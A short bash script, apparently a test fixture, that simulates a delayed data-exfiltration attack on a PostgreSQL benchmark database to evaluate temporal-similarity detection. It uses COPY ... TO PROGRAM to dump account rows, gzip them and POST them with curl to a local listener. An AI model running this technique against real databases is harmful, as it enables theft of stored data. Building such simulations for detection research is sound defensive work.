#!/bin/bash
echo "Simulating Data Exfiltration Attack B (Delayed 2s)..."

# Adding a 2-second sleep before the external process connects to test temporal similarity algorithms
psql -U postgres -d casce_tpcb -c "COPY (SELECT * FROM pgbench_accounts LIMIT 500) TO PROGRAM 'sleep 2 && gzip > /tmp/accounts_exfil_b.gz && curl -s -X POST -d @/tmp/accounts_exfil_b.gz http://127.0.0.1:9090 > /dev/null 2>&1 || true';"

echo "Delayed (2s) data exfiltration attempted."
